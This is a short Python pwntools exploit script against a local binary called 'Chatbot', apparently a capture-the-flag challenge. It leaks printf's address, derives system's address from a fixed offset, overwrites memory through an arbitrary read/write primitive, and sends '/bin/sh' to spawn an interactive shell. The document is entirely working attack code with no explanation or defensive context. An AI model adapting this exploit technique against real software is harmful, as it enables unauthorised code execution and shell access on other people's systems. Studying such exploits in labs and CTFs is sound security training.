import sys
import struct
from pwn import *

sh = process("./Chatbot")
res = sh.recvline()
print(res)
printf = int(res,16)

res = sh.recvline()
print(res)

# step 1 arbitrary reading

pad = "AAAAAAAA"*4
write_addr = struct.pack("<Q", 0x555555755040)
s1 = pad + write_addr + "\n"
sh.send(s1)

res = sh.recvline()
print(res)

# step 2 arbitrary writing
system = struct.pack("<Q", printf-0xfd10)
print(hex(printf-0xfd10))
s2 = system + "\n" + "/bin/sh\n"
sh.send(s2)
sh.interactive()
